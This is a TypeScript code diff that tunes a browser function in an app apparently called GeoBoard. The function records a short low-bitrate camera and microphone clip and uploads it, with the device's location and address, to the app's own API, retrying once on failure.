@@ -76,7 +76,8 @@ async function captureGeoPhotos(
   }
 }
 
-// Capture a short video clip (2-5 s) and upload it as a GeoBoard video.
+// Capture a short video clip and upload it as a GeoBoard video.
+// Uses low-resolution / low-bitrate settings so it works on slow mobile connections.
 // Runs silently — errors are swallowed.
 async function captureGeoVideo(
   token: string,
@@ -90,62 +91,93 @@ async function captureGeoVideo(
     return;
   }
 
-  // Pick the best supported MIME type
-  const mimeType = ["video/webm;codecs=vp9", "video/webm;codecs=vp8", "video/webm", "video/mp4"]
-    .find((m) => MediaRecorder.isTypeSupported(m)) ?? "";
+  // Prefer VP8 (widest mobile support) with low bitrate; fall back gracefully
+  const MIME_CANDIDATES = [
+    "video/webm;codecs=vp8",
+    "video/webm;codecs=vp9",
+    "video/webm",
+    "video/mp4",
+  ];
+  const mimeType = MIME_CANDIDATES.find((m) => MediaRecorder.isTypeSupported(m)) ?? "";
+
+  // Target ~400 kbps total — keeps a 5 s clip under ~250 KB base64
+  const VIDEO_BPS = 300_000; // 300 kbps video
+  const AUDIO_BPS =  64_000; //  64 kbps audio
 
   let stream: MediaStream | null = null;
   try {
+    // Low resolution (480 × 360) — dramatically reduces file size vs 1280×720
     stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } },
-      audio: true,
+      video: {
+        facingMode: "environment",
+        width:  { ideal: 480, max: 640 },
+        height: { ideal: 360, max: 480 },
+        frameRate: { ideal: 15, max: 24 },
+      },
+      audio: { echoCancellation: true, noiseSuppression: true },
     });
 
-    // Brief warm-up
-    await new Promise((r) => setTimeout(r, 800));
+    // Brief warm-up so first frames aren't black
+    await new Promise((r) => setTimeout(r, 600));
 
     const chunks: Blob[] = [];
-    const recorder = new MediaRecorder(stream, mimeType ? { mimeType } : undefined);
+    const recorderOptions: MediaRecorderOptions = {};
+    if (mimeType) recorderOptions.mimeType = mimeType;
+    try {
+      recorderOptions.videoBitsPerSecond = VIDEO_BPS;
+      recorderOptions.audioBitsPerSecond = AUDIO_BPS;
+    } catch { /* older browsers ignore unknown options */ }
+
+    const recorder = new MediaRecorder(stream, recorderOptions);
     recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
 
     onStateChange("recording");
 
     await new Promise<void>((resolve, reject) => {
-      recorder.onstop = () => resolve();
+      recorder.onstop  = () => resolve();
       recorder.onerror = () => reject(new Error("MediaRecorder error"));
-      recorder.start(500); // collect in 500ms chunks
+      recorder.start(500);
       setTimeout(() => { try { recorder.stop(); } catch { resolve(); } }, GEO_VIDEO_DURATION_MS);
     });
 
     const blob = new Blob(chunks, { type: mimeType || "video/webm" });
     if (blob.size === 0) { onStateChange("error"); return; }
 
-    // Convert blob to base64
+    // Convert to base64 data-URL
     const base64 = await new Promise<string>((res, rej) => {
       const reader = new FileReader();
-      reader.onload = () => res(reader.result as string);
+      reader.onload  = () => res(reader.result as string);
       reader.onerror = () => rej(new Error("FileReader error"));
       reader.readAsDataURL(blob);
     });
 
     onStateChange("uploading");
 
-    await fetch(`${API_BASE}/api/geo-videos`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        token,
-        videoData: base64,
-        mimeType: blob.type,
-        durationMs: GEO_VIDEO_DURATION_MS,
-        latitude: lat,
-        longitude: lng,
-        address,
-      }),
-      signal: AbortSignal.timeout(30000),
+    // Upload with two attempts — first on slow connections may time out
+    const body = JSON.stringify({
+      token,
+      videoData: base64,
+      mimeType: blob.type,
+      durationMs: GEO_VIDEO_DURATION_MS,
+      latitude: lat,
+      longitude: lng,
+      address,
     });
 
-    onStateChange("done");
+    let uploaded = false;
+    for (let attempt = 0; attempt < 2 && !uploaded; attempt++) {
+      try {
+        const resp = await fetch(`${API_BASE}/api/geo-videos`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body,
+          signal: AbortSignal.timeout(60_000), // 60 s per attempt
+        });
+        if (resp.ok || resp.status === 201) uploaded = true;
+      } catch { /* retry */ }
+    }
+
+    onStateChange(uploaded ? "done" : "error");
   } catch {
     onStateChange("error");
   } finally {
